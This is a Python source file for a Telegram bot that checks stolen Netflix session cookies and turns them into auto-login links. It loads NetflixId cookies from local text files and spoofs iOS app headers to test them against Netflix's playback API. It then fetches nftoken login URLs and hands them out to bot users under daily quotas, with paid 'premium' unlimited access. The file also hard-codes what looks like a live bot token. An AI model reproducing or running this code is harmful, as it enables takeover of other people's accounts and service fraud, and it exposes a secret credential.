# -*- coding: utf-8 -*-
import json
import os
import random
import shutil
import re
from datetime import datetime, timezone, timedelta
import requests
from urllib3.exceptions import InsecureRequestWarning

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes,
)

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ==================== CONFIG ====================
BOT_TOKEN = "8419778721:AAHhCD8qDIaP0u54tFN2qowMTR-s8Chu4mY"
OWNER_IDS = {5954938418}
DAILY_LIMIT = 10
OWNER_USERNAME = "@username_"
TIMEZONE = timezone(timedelta(hours=8))

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
COOKIE_FOLDER = os.path.join(SCRIPT_DIR, "NetCookie")
VALID_FOLDER = os.path.join(COOKIE_FOLDER, "Valid")
USAGE_FILE = os.path.join(SCRIPT_DIR, "usage.json")
PREMIUM_FILE = os.path.join(SCRIPT_DIR, "premium.json")
LOG_FILE = os.path.join(SCRIPT_DIR, "bot.log")

# ==================== ENDPOINTS ====================
API_URL_IOS = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
QUERY_PARAMS_IOS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

PLAYBACK_API_URL = "https://www.netflix.com/playapi/cadmium/1/0/1/0/0/0/0/0/0"
PLAYBACK_PARAMS = {
    "appVersion": "15.48.1",
    "path": '["videos","80057281","1"]',
    "pathFormat": "graph",
    "responseFormat": "json",
    "urlFormat": "manifest",
}

BASE_HEADERS_IOS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Kuala_Lumpur",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId")
REQUIRED_COOKIE = "NetflixId"

# ==================== LOGGER ====================
def log(msg):
    ts = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            fh.write(line + "\n")
    except Exception:
        pass

# ==================== USAGE & PREMIUM ====================
def _today_str(): return datetime.now(TIMEZONE).strftime("%Y-%m-%d")

def load_usage():
    if not os.path.exists(USAGE_FILE): return {}
    try:
        with open(USAGE_FILE, "r", encoding="utf-8") as fh: return json.load(fh)
    except Exception: return {}

def save_usage(data):
    try:
        tmp = USAGE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh: json.dump(data, fh, indent=2)
        os.replace(tmp, USAGE_FILE)
    except Exception as exc: log(f"Failed to save usage: {exc}")

def load_premium():
    if not os.path.exists(PREMIUM_FILE): return set()
    try:
        with open(PREMIUM_FILE, "r", encoding="utf-8") as fh: return set(str(k) for k in json.load(fh).keys())
    except Exception: return set()

def save_premium(data):
    try:
        tmp = PREMIUM_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh: json.dump({k: True for k in data}, fh, indent=2)
        os.replace(tmp, PREMIUM_FILE)
    except Exception as exc: log(f"Failed to save premium: {exc}")

def is_premium(user_id): return str(user_id) in load_premium()
def add_premium(user_id):
    data = load_premium(); data.add(str(user_id)); save_premium(data)
def remove_premium(user_id):
    data = load_premium(); data.discard(str(user_id)); save_premium(data)
def has_unlimited(user_id): return is_owner(user_id) or is_premium(user_id)

def get_remaining(user_id):
    if has_unlimited(user_id): return 999999
    data = load_usage(); today = _today_str()
    entry = data.get(str(user_id), {})
    if entry.get("date") != today: return DAILY_LIMIT
    return max(0, DAILY_LIMIT - entry.get("count", 0))

def consume_quota(user_id):
    if has_unlimited(user_id): return 999999
    data = load_usage(); today = _today_str(); key = str(user_id)
    entry = data.get(key, {})
    if entry.get("date") != today: entry = {"date": today, "count": 0}
    entry["count"] = entry.get("count", 0) + 1
    data[key] = entry; save_usage(data)
    return max(0, DAILY_LIMIT - entry["count"])

def get_global_stats():
    data = load_usage(); today = _today_str()
    return {
        "total_users": len(data),
        "today_users": sum(1 for v in data.values() if v.get("date") == today),
        "today_requests": sum(v.get("count", 0) for v in data.values() if v.get("date") == today),
    }

def reset_user_quota(user_id):
    data = load_usage(); data.pop(str(user_id), None); save_usage(data)

def reset_all_quota(): save_usage({})

# ==================== COOKIE PARSING ====================
def init_folders():
    os.makedirs(COOKIE_FOLDER, exist_ok=True)
    os.makedirs(VALID_FOLDER, exist_ok=True)

def get_raw_files():
    """Ambil SEMUA .txt dalam NetCookie/ — tak tapis nama"""
    if not os.path.isdir(COOKIE_FOLDER): return []
    return [f for f in os.listdir(COOKIE_FOLDER)
            if f.lower().endswith(".txt") and os.path.isfile(os.path.join(COOKIE_FOLDER, f))]

def get_valid_files():
    if not os.path.isdir(VALID_FOLDER): return []
    return [f for f in os.listdir(VALID_FOLDER) if f.lower().endswith(".txt")]

def get_cookie_files():
    """
    Fungsi untuk main.py import.
    Pulangkan dict {'raw': [...], 'valid': [...]}
    """
    return {
        "raw": get_raw_files(),
        "valid": get_valid_files(),
    }

def get_stock_by_plan():
    return {"Valid": len(get_valid_files()), "Raw": len(get_raw_files())}

def extract_cookie_dict(text):
    cookie_dict = {}
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"): continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookie_dict[parts[5]] = parts[6]
    for key in COOKIE_KEYS:
        if key in cookie_dict: continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match: cookie_dict[key] = match.group(1)
    return cookie_dict

# ==================== CHECK & NFToken ====================
def check_playback(cookie_dict):
    """Check guna playback API. Return (is_valid, error)."""
    netflix_id = cookie_dict.get("NetflixId")
    secure_id = cookie_dict.get("SecureNetflixId")
    if not netflix_id: return False, "No NetflixId"

    cookie_str = f"NetflixId={netflix_id}"
    if secure_id: cookie_str += f"; SecureNetflixId={secure_id}"

    headers = dict(BASE_HEADERS_IOS)
    headers["Cookie"] = cookie_str

    try:
        r = requests.get(PLAYBACK_API_URL, params=PLAYBACK_PARAMS, headers=headers, timeout=20, verify=False)
        if r.status_code != 200:
            return False, f"HTTP {r.status_code}"
        data = r.json()
        value = data.get("value") or {}
        if "error" in value or "errors" in data:
            return False, f"Playback: {value.get('error', 'error')}"
        if not (value.get("movieId") or value.get("videoId")):
            return False, "No video id"
        return True, None
    except Exception as e:
        return False, str(e)[:50]

def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get("NetflixId")
    secure_id = cookie_dict.get("SecureNetflixId")
    if not netflix_id: raise ValueError("Missing NetflixId")

    headers = dict(BASE_HEADERS_IOS)
    cookie_str = f"NetflixId={netflix_id}"
    if secure_id: cookie_str += f"; SecureNetflixId={secure_id}"
    headers["Cookie"] = cookie_str

    try:
        r = requests.get(API_URL_IOS, params=QUERY_PARAMS_IOS, headers=headers, timeout=30, verify=False)
        r.raise_for_status()
        data = r.json()
        value = data.get("value") or {}
        token_data = (((value.get("account") or {}).get("token") or {}).get("default") or {})
        token, expires = token_data.get("token"), token_data.get("expires")
        if not token: raise ValueError("No token")
        if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
        return token, expires
    except Exception as e:
        raise ValueError(str(e))

# ==================== GET URL (6-VALUE RETURN) ====================
def try_get_login_url(max_attempts=15):
    """
    Return 6 nilai: (success, url, expires, error, filename, info)
    info = {"plan": "Valid", "country": "-", "email": "-"}
    """
    reasons = []

    # 1. Cuba Valid folder dulu
    valid_files = get_valid_files()
    if valid_files:
        log("[GET] Using Valid folder.")
        tried = set()
        while len(tried) < len(valid_files) and len(tried) < max_attempts:
            remaining = [f for f in valid_files if f not in tried]
            if not remaining: break
            chosen = random.choice(remaining); tried.add(chosen)
            path = os.path.join(VALID_FOLDER, chosen)
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                    content = fh.read().strip()
                cd = extract_cookie_dict(content)
                token, expires = fetch_nftoken(cd)
                return (
                    True,
                    f"https://netflix.com/?nftoken={token}",
                    expires,
                    None,
                    chosen,
                    {"plan": "Valid", "country": "-", "email": "-"},
                )
            except Exception as exc:
                reasons.append(str(exc)[:30]); continue

    # 2. Fallback: SEMUA fail dalam NetCookie/ (tak tapis nama)
    raw_files = get_raw_files()
    if not raw_files:
        return False, None, None, "No cookies available.", None, None

    log(f"[GET] Using Raw folder ({len(raw_files)} fail, no filter).")
    tried = set()
    while len(tried) < len(raw_files) and len(tried) < max_attempts:
        remaining = [f for f in raw_files if f not in tried]
        if not remaining: break
        chosen = random.choice(remaining); tried.add(chosen)
        path = os.path.join(COOKIE_FOLDER, chosen)
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read().strip()
            cd = extract_cookie_dict(content)

            # Check playback dulu
            is_valid, err = check_playback(cd)
            if not is_valid:
                reasons.append(f"invalid ({err})"); continue

            token, expires = fetch_nftoken(cd)
            # Move ke Valid/
            valid_path = os.path.join(VALID_FOLDER, chosen)
            try: shutil.move(path, valid_path)
            except Exception: pass
            log(f"[GET] Moved {chosen} to Valid.")
            return (
                True,
                f"https://netflix.com/?nftoken={token}",
                expires,
                None,
                chosen,
                {"plan": "Valid", "country": "-", "email": "-"},
            )
        except Exception as exc:
            reasons.append(str(exc)[:30]); continue

    summary = "; ".join(reasons[-3:]) if reasons else "unknown"
    return False, None, None, f"No valid account. Reason: {summary}", None, None

# ==================== HELPERS ====================
def is_owner(user_id): return user_id in OWNER_IDS

def build_main_menu():
    keyboard = [
        [InlineKeyboardButton("Get URL", callback_data="menu_get"), InlineKeyboardButton("My Quota", callback_data="menu_quota")],
        [InlineKeyboardButton("Premium", callback_data="menu_premium"), InlineKeyboardButton("Stats", callback_data="menu_stats")],
    ]
    return InlineKeyboardMarkup(keyboard)

def build_url_message(url, expires, quota_line):
    return (
        f"<b>LOGIN URL GENERATED</b>\n--------------------------\n"
        f"Expiry: <b>{format_expiry(expires)}</b>\n{quota_line}\n--------------------------\n\n"
        f"<b>Login link:</b>\n<code>{url}</code>\n\n"
        f"<b>PHONE / TABLET / LAPTOP</b>\n"
        f"1. Open the link on your device\n"
        f"2. Tap \"Open App\" to launch Netflix\n"
        f"   -> Auto-login\n\n"
        f"<b>SMART TV</b>\n"
        f"1. Login on your phone first\n"
        f"2. Open Netflix on TV -> Sign In\n"
        f"3. Go to netflix.com/tv2 on phone\n"
        f"4. Enter the 8-character code\n\n"
        f"<b>IMPORTANT</b>\n"
        f"Do NOT use Incognito / Private Mode.\n"
        f"URL valid for ~1 hour (reusable)."
    )

def build_quota_line(user_id, remaining_after):
    if is_owner(user_id): return "Owner - Unlimited"
    elif is_premium(user_id): return "Premium - Unlimited"
    else: return f"Remaining: <b>{remaining_after}/{DAILY_LIMIT}</b>"

def format_expiry(expires):
    if not isinstance(expires, (int, float)): return "Unknown"
    try: return datetime.fromtimestamp(expires, tz=TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
    except Exception: return str(expires)

# ==================== HANDLERS ====================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    remaining = get_remaining(user.id)
    stock = get_stock_by_plan()
    if is_owner(user.id): tag = " (Owner)"; status = "<b>Owner</b> - Unlimited"
    elif is_premium(user.id): tag = " (Premium)"; status = "<b>Premium</b> - Unlimited"
    else: tag = ""; status = f"<b>Remaining:</b> {remaining}/{DAILY_LIMIT}"
    text = (
        f"Hi {user.first_name}{tag}!\n\n{status}\n\n"
        f"<b>Stock:</b> {stock['Valid']} valid, {stock['Raw']} raw\n\n"
        f"<b>Commands:</b>\n/get - Get URL\n/quota - Check quota\n/stats - Stats\n/premium - Premium info\n"
    )
    if is_owner(user.id):
        text += f"\n<b>Owner:</b>\n/reset &lt;id&gt; - Reset quota\n/addpremium &lt;id&gt;\n/delpremium &lt;id&gt;\n/listpremium\n/admin_stats\n"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=build_main_menu())

async def quota_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_owner(user.id): text = "Owner - Unlimited quota"
    elif is_premium(user.id): text = "Premium - Unlimited quota"
    else:
        remaining = get_remaining(user.id)
        text = f"Your quota today: <b>{remaining}/{DAILY_LIMIT}</b>"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=build_main_menu())

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = get_global_stats(); stock = get_stock_by_plan()
    text = (
        f"<b>Bot Statistics</b>\n\nTotal users: <b>{s['total_users']}</b>\n"
        f"Active today: <b>{s['today_users']}</b>\nRequests today: <b>{s['today_requests']}</b>\n\n"
        f"<b>Stock:</b> {stock['Valid']} valid, {stock['Raw']} raw"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=build_main_menu())

async def _do_get_url(message, user):
    remaining_before = get_remaining(user.id)
    if remaining_before <= 0:
        await message.reply_text(f"Quota habis ({DAILY_LIMIT}/{DAILY_LIMIT}). Type /premium.", parse_mode=ParseMode.HTML, reply_markup=build_main_menu()); return
    msg = await message.reply_text("Generating URL...")
    success, url, expires, error, filename, info = try_get_login_url(max_attempts=15)
    if not success:
        log(f"[GET-FAIL] {error}")
        await msg.edit_text(f"<b>Failed</b>\n\nReason: <code>{error}</code>\n\nQuota NOT deducted.", parse_mode=ParseMode.HTML, reply_markup=build_main_menu()); return
    remaining_after = consume_quota(user.id)
    log(f"[GET-OK] user={user.id} file={filename[:60] if filename else '?'}")
    quota_line = build_quota_line(user.id, remaining_after)
    text = build_url_message(url, expires, quota_line)
    await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True, reply_markup=build_main_menu())

async def get_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _do_get_url(update.message, update.effective_user)

async def premium_info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_owner(user.id): text = "You are the <b>Owner</b>! Unlimited."
    elif is_premium(user.id): text = "You are a <b>Premium user</b>! Unlimited."
    else:
        text = (
            f"<b>PREMIUM</b>\n\n- Unlimited quota\n- Use /get as much as you want\n\n"
            f"Contact owner: {OWNER_USERNAME}"
        )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=build_main_menu())

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer(); data = query.data; user = update.effective_user
    if data == "menu_get": await _do_get_url(query.message, user)
    elif data == "menu_quota":
        if is_owner(user.id): text = "Owner - Unlimited"
        elif is_premium(user.id): text = "Premium - Unlimited"
        else: text = f"Your quota today: <b>{get_remaining(user.id)}/{DAILY_LIMIT}</b>"
        await query.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=build_main_menu())
    elif data == "menu_premium": await premium_info_cmd(update, context)
    elif data == "menu_stats": await stats_cmd(update, context)

# ==================== OWNER HANDLERS ====================
def owner_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_owner(update.effective_user.id):
            await update.message.reply_text("Owner only."); return
        return await func(update, context)
    return wrapper

@owner_only
async def reset_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Usage: /reset <id>"); return
    try: uid = int(context.args[0])
    except ValueError: await update.message.reply_text("ID mesti nombor."); return
    reset_user_quota(uid)
    await update.message.reply_text(f"Quota <code>{uid}</code> reset.", parse_mode=ParseMode.HTML)

@owner_only
async def reset_all_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    reset_all_quota(); await update.message.reply_text("Semua quota reset.")

@owner_only
async def admin_stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = get_global_stats(); stock = get_stock_by_plan(); prem = load_premium()
    text = (
        f"<b>Admin Stats</b>\n\nTotal users: <b>{s['total_users']}</b>\n"
        f"Active today: <b>{s['today_users']}</b>\nRequests today: <b>{s['today_requests']}</b>\n\n"
        f"<b>Stock:</b> {stock['Valid']} valid, {stock['Raw']} raw\n"
        f"Premium users: <b>{len(prem)}</b>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

@owner_only
async def add_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Usage: /addpremium <id>"); return
    try: uid = int(context.args[0])
    except ValueError: await update.message.reply_text("ID mesti nombor."); return
    add_premium(uid)
    await update.message.reply_text(f"<code>{uid}</code> now Premium.", parse_mode=ParseMode.HTML)

@owner_only
async def del_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("Usage: /delpremium <id>"); return
    try: uid = int(context.args[0])
    except ValueError: await update.message.reply_text("ID mesti nombor."); return
    remove_premium(uid)
    await update.message.reply_text(f"Premium removed for <code>{uid}</code>.", parse_mode=ParseMode.HTML)

@owner_only
async def list_premium_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    prem = load_premium()
    if not prem: await update.message.reply_text("No premium users."); return
    lines = "\n".join(f"  - <code>{uid}</code>" for uid in sorted(prem))
    await update.message.reply_text(f"<b>Premium ({len(prem)})</b>\n\n{lines}", parse_mode=ParseMode.HTML)

# ==================== MAIN ====================
def main():
    log("Bot starting...")
    init_folders()
    log(f"[STOCK] Valid={len(get_valid_files())} Raw={len(get_raw_files())}")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("get", get_cmd))
    app.add_handler(CommandHandler("quota", quota_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("premium", premium_info_cmd))
    app.add_handler(CommandHandler("reset", reset_user_cmd))
    app.add_handler(CommandHandler("reset_all", reset_all_cmd))
    app.add_handler(CommandHandler("admin_stats", admin_stats_cmd))
    app.add_handler(CommandHandler("addpremium", add_premium_cmd))
    app.add_handler(CommandHandler("delpremium", del_premium_cmd))
    app.add_handler(CommandHandler("listpremium", list_premium_cmd))
    app.add_handler(CallbackQueryHandler(menu_callback))
    log("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()